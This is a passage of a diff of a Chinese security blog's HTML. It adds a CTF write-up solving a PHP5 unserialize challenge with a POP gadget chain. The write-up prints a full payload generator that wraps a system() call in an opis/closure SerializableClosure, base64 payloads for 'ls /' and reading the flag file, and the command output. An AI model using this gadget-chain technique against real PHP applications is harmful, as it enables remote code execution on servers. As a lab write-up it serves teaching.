class="string">&quot;_loader&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])&#123;</span><br><span class="line">    unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;一条链子&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>我们先来学习一下<code>_loader()</code>函数，这是一个自动加载函数，在PHP5中，当我们实例化一个未定义的类时，就会触发此函数。</p>
+</li>
+<li><p><code>spl_autoload_register(&#39;loadprint&#39;)</code>与<code>__autoload()</code>函数有异曲同工之妙，PHP碰到没有定义的类就执行<code>loadprint()</code>函数。</p>
+</li>
+<li><p>所以我们在<code>index.php</code>中可以自由的实例化存在的类。由于是反序列化的题目，我们先来看看入口点<code>__destruct()</code>和<code>__wakeup()</code>函数是否存在：</p>
+<ul>
+<li><code>\Control\State\StopHook.php</code>中发现了析构函数，调用了同类中的<code>_exit()</code>函数，其中<code>$process-&gt;stop();</code>可能会触发<code>__call()</code>函数，而<code>!$process-&gt;isRunning</code>可能会触发<code>__get()</code>函数：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Control</span>\<span class="title">State</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StopHook</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [<span class="string">&#x27;auto&#x27;</span> =&gt; <span class="number">0</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$states</span> = [<span class="string">&#x27;started&#x27;</span>, <span class="string">&#x27;running&#x27;</span>, <span class="string">&#x27;finished&#x27;</span>, <span class="string">&#x27;waiting&#x27;</span>, <span class="string">&#x27;fail&#x27;</span>];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$processes</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_exit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_exit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;isRunning) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$process</span>-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在<code>\Faker\MyGenerator.php</code>中找到这两个函数，<code>__call()</code>函数中<code>echo $this-&gt;defaultCall;</code>一句可能会触发<code>__toString()</code>函数：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$defaultValue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$arg_array</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultCall;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$property</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;defaultValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在<code>\Method\Func\GetFile.php</code>找到<code>__toString()</code>函数，调用了同类中的<code>getFiles()</code>函数，发现函数的中调用了<code>isset()</code>函数，如果该类中不存在该属性，会触发<code>__isset()</code>函数：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFile</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getFiles();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFiles</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;flag) <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">        <span class="variable">$s</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;flag-&gt;&#123;<span class="keyword">$this</span>-&gt;value&#125;)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span> += <span class="variable">$file</span>-&gt;read();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在<code>Method\Func\GetDefault.php</code>中找到<code>__isset()</code>函数，调用了同类中的<code>popup()</code>函数，其中<code>return $s($length);</code>可能会触发<code>__invoke()</code>函数：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetDefault</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">popup</span>(<span class="params"><span class="variable">$length</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$s</span>-&gt;flag != <span class="string">&quot;myTest&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;denied&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>(<span class="variable">$length</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$property</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$property</span> != <span class="string">&quot;test&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;popup(<span class="number">666</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>最后在<code>\Method\Func\GenerateFile.php</code>中找到<code>__invoke()</code>函数，且存在<code>call_user_func()</code>。没有想到在php5中是可以直接赋值在一个没有初始化的变量上的2333。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenerateFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$param</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;myGen(<span class="variable">$param</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myGen</span>(<span class="params"><span class="variable">$length</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="keyword">$this</span>-&gt;buffer-&gt;read;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;source-&gt;generate, <span class="variable">$length</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>整个链子理清楚了，但是发现<code>call_user_func()</code>的第二个参数被写死了，因为<code>$this-&gt;popup(666);</code>调用的时候将<code>666</code>传入了<code>__invoke($param)</code>，最后也就作为<code>$length</code>变量传入了<code>myGen($length)</code>函数。</p>
+</li>
+<li><p>现在只能够调用类似<code>phpinfo()</code>等不需要参数的程序，并不能够rce，该怎么办呢？</p>
+<ul>
+<li>这时候我们注意到存在<code>function.php</code>，发现这个cms是基于<code>opis/closure</code>搭建的，网址：<a target="_blank" rel="noopener" href="https://github.com/opis/closure">https://github.com/opis/closure</a></li>
+<li>该项目是用来闭包类对象的，官方文档：<a target="_blank" rel="noopener" href="https://opis.io/closure/3.x/serialize.html%E3%80%82php%E4%B8%AD%E7%9A%84%E9%97%AD%E5%8C%85%E5%87%BD%E6%95%B0%EF%BC%88%E4%BB%85%E5%AF%B9php%EF%BC%89%E5%8D%B3%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%80%E8%88%AC%E6%98%AF%E6%97%A0%E6%B3%95%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%EF%BC%8C%E4%B8%80%E8%88%AC%E4%BC%9A%E6%8A%A5%E9%94%99%EF%BC%9A">https://opis.io/closure/3.x/serialize.html。php中的闭包函数（仅对php）即匿名函数，一般是无法进行序列化的，一般会报错：</a></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$function</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught exception &#39;Exception&#39; with message &#39;Serialization of &#39;Closure&#39; is not allowed&#39;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用这个项目，可以将闭包包装成一个<code>Opis\Closure\SerializableClosure</code>对象，然后使用标准的<code>serialize()</code>进行序列化。也可以使用<code>Opis\Closure\serialize</code>函数序列化任意对象。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> \Opis\<span class="built_in">Closure</span>\SerializableClosure(<span class="variable">$function</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>)); &#125;;</span><br><span class="line"><span class="keyword">echo</span> \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$function</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:32:&quot;Opis\Closure\SerializableClosure&quot;:156:&#123;a:5:&#123;s:3:&quot;use&quot;;a:0:&#123;&#125;s:8:&quot;function&quot;;s:33:&quot;function()&#123; eval(\system(&#39;ls&#39;));&#125;&quot;;s:5:&quot;scope&quot;;N;s:4:&quot;this&quot;;N;s:4:&quot;self&quot;;s:32:&quot;0000000054d6224100000000237e90a4&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>那么我们可以将匿名函数通过<code>serialize()</code>函数经过一次序列化和反序列化，这样他就能作为<code>SerializableClosure</code>对象被序列化。或者直接将<code>generate</code>变量赋值为<code>SerializableClosure</code>类。</p>
+</li>
+<li><p>payload：</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Control</span>\<span class="title">State</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">StopHook</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; processes = <span class="keyword">array</span>(<span class="keyword">new</span> \Faker\MyGenerator());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="keyword">new</span> StopHook();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MyGenerator</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">defaultValue</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; defaultValue = <span class="keyword">new</span> \Method\Func\GetFile();</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GetFile</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">flag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; flag = <span class="keyword">new</span> \Method\Func\GetDefault();</span><br><span class="line">            <span class="keyword">$this</span> -&gt; value = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GetDefault</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">source</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source = <span class="keyword">new</span> \Method\Func\GenerateFile();</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source -&gt; flag = <span class="string">&#x27;myTest&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenerateFile</span> &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">flag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls /&#x27;</span>)); &#125;;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source -&gt; generate = <span class="keyword">new</span> \Opis\<span class="built_in">Closure</span>\SerializableClosure(<span class="variable">$function</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将php文件放在<code>/www</code>文件夹下运行，得到序列化的结果（其实在php5中赋值一个对象在一个空变量中是会警告的<code>HP Warning:  Creating default object from empty value in /var/www/1.php on line 51</code>，在php8中就直接报错了）：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6MTp7czoxMjoiACoAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjE3OiJGYWtlclxNeUdlbmVyYXRvciI6MTp7czoxNToiACoAZGVmYXVsdFZhbHVlIjtPOjE5OiJNZXRob2RcRnVuY1xHZXRGaWxlIjoyOntzOjI1OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmbGFnIjtPOjIyOiJNZXRob2RcRnVuY1xHZXREZWZhdWx0IjoxOntzOjMwOiIATWV0aG9kXEZ1bmNcR2V0RGVmYXVsdABzb3VyY2UiO086MjQ6Ik1ldGhvZFxGdW5jXEdlbmVyYXRlRmlsZSI6Mzp7czo0OiJmbGFnIjtzOjY6Im15VGVzdCI7czo5OiIAKgBidWZmZXIiO047czo2OiJzb3VyY2UiO086ODoic3RkQ2xhc3MiOjE6e3M6ODoiZ2VuZXJhdGUiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoxODg6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6MzU6ImZ1bmN0aW9uKCl7IGV2YWwoc3lzdGVtKCdscyAvJykpOyB9IjtzOjU6InNjb3BlIjtzOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiO3M6NDoidGhpcyI7TjtzOjQ6InNlbGYiO3M6MzI6IjAwMDAwMDAwMmIzZjg4ZGMwMDAwMDAwMDE5NjUyZjhjIjt9fX19fXM6NToidmFsdWUiO3M6NDoidGVzdCI7fX19fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将作为post参数data传递，获得回显：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin dev etc f1@g.txt home lib media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>修改<code>$function = function()&#123; eval(system(&#39;cat /fl@g.txt&#39;)); &#125;;</code>，重新序列化：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6MTp7czoxMjoiACoAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjE3OiJGYWtlclxNeUdlbmVyYXRvciI6MTp7czoxNToiACoAZGVmYXVsdFZhbHVlIjtPOjE5OiJNZXRob2RcRnVuY1xHZXRGaWxlIjoyOntzOjI1OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmbGFnIjtPOjIyOiJNZXRob2RcRnVuY1xHZXREZWZhdWx0IjoxOntzOjMwOiIATWV0aG9kXEZ1bmNcR2V0RGVmYXVsdABzb3VyY2UiO086MjQ6Ik1ldGhvZFxGdW5jXEdlbmVyYXRlRmlsZSI6Mzp7czo0OiJmbGFnIjtzOjY6Im15VGVzdCI7czo5OiIAKgBidWZmZXIiO047czo2OiJzb3VyY2UiO086ODoic3RkQ2xhc3MiOjE6e3M6ODoiZ2VuZXJhdGUiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoxOTc6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6NDQ6ImZ1bmN0aW9uKCl7IGV2YWwoc3lzdGVtKCdjYXQgL2YxQGcudHh0JykpOyB9IjtzOjU6InNjb3BlIjtzOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiO3M6NDoidGhpcyI7TjtzOjQ6InNlbGYiO3M6MzI6IjAwMDAwMDAwNzBkY2RiODIwMDAwMDAwMGFiNmZiZTVmIjt9fX19fXM6NToidmFsdWUiO3M6NDoidGVzdCI7fX19fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure></li>
+<li><p>获得flag：</p>
+</li>
+</ul>
+<p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318190.png" alt="image-20211002021317038"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;16ed60c5-d06f-4974-931b-a26b07b5618d&#125;</span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/10/05/xxc/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-uploadlabs" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -945,551 +1533,9 @@
     </section>
   
   
-    <article id="post-uploadlabs-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/25/uploadlabs-1/">uploadlabs-1</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/09/25/uploadlabs-1/" class="archive-article-date">
-  	<time datetime="2021-09-25T14:06:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>代码：</p>
